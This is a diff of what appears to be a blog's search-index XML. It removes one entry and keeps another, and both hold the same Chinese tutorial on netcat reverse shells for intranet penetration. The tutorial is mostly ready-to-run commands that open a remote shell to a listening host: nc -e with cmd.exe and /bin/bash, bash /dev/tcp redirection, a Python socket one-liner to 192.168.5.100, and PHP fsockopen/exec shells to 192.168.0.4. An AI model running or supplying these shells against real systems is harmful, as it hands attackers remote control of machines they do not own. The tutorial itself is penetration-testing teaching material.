@@ -9,17 +9,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[nc反弹shell详解]]></title>
-    <url>%2F2019%2F12%2F22%2Fnc%E5%8F%8D%E5%BC%B9shell%E8%AF%A6%E8%A7%A3-1.html</url>
-    <content type="text"><![CDATA[概述nc为netcat，可以进行服务器端口监听，然后把服务器的一个shell反弹回来，然后可以在本地终端控制服务器终端。 Windows下正向连接：123服务器执行：nc –l –p 8888 –e cmd.exe 本地主机执行：nc –vv 服务器ip 8888 反向连接：123 服务器执行：nc –e cmd.exe 公网ip 8888​ 公网主机执行：nc –lvp 8888 Linux下方法一：​ 反弹shell命令： 1bash –i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ​ kali端口监听： 1nc –lvvp 8888 注：shell三种标准文件描述符： ​ 0 – stdin 代表标准输入，使用&lt;或&lt;&lt; ​ 1 – stdout 代表标准输出，使用&gt;或&gt;&gt; ​ 2 – stderr 代表标准错误输出，使用2&gt;或2&gt;&gt; ​ &gt;&amp;的含义： ​ 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 ​ 当&gt;&amp;后面接文件描述时，表示将前面的文件描述符重定向至后面的文件描述符 方法二：使用python反弹shell： 1Python –c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.5.100',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" 方法三： 使用nc工具反弹shell： 123 nc –e /bin/bash ip 7777​ nc –lvvp 7777 方法四：使用php反弹shell： 123 php- 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'​ php -r '$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");']]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title></title>
     <url>%2F2019%2F05%2F28%2Fnc%E5%8F%8D%E5%BC%B9shell%E8%AF%A6%E8%A7%A3.html</url>
     <content type="text"><![CDATA[layout: posttitle: nc反弹shell详解author: Mr.zhangcategories: Security date: 2019-11-30 17:30:00tags:内网渗透 概述nc为netcat，可以进行服务器端口监听，然后把服务器的一个shell反弹回来，然后可以在本地终端控制服务器终端。 Windows下正向连接：123服务器执行：nc –l –p 8888 –e cmd.exe 本地主机执行：nc –vv 服务器ip 8888 反向连接：123 服务器执行：nc –e cmd.exe 公网ip 8888​ 公网主机执行：nc –lvp 8888 Linux下方法一：​ 反弹shell命令： 1bash –i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ​ kali端口监听： ​ nc –lvvp 8888 注：shell三种标准文件描述符： ​ 0 – stdin 代表标准输入，使用&lt;或&lt;&lt; ​ 1 – stdout 代表标准输出，使用&gt;或&gt;&gt; ​ 2 – stderr 代表标准错误输出，使用2&gt;或2&gt;&gt; ​ &gt;&amp;的含义： ​ 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 ​ 当&gt;&amp;后面接文件描述时，表示将前面的文件描述符重定向至后面的文件描述符 \方法二****：**** ​ 使用python反弹shell： Python –c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.5.100’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);” \方法三：** ​ 使用nc工具反弹shell： ​ nc –e /bin/bash ip 7777 ​ nc –lvvp 7777 \方法四：** ​ 使用php反弹shell： ​ php- ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777”)’ ​ php -r ‘$sock=fsockopen(“192.168.0.4”,7777);exec(“/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3”);’]]></content>
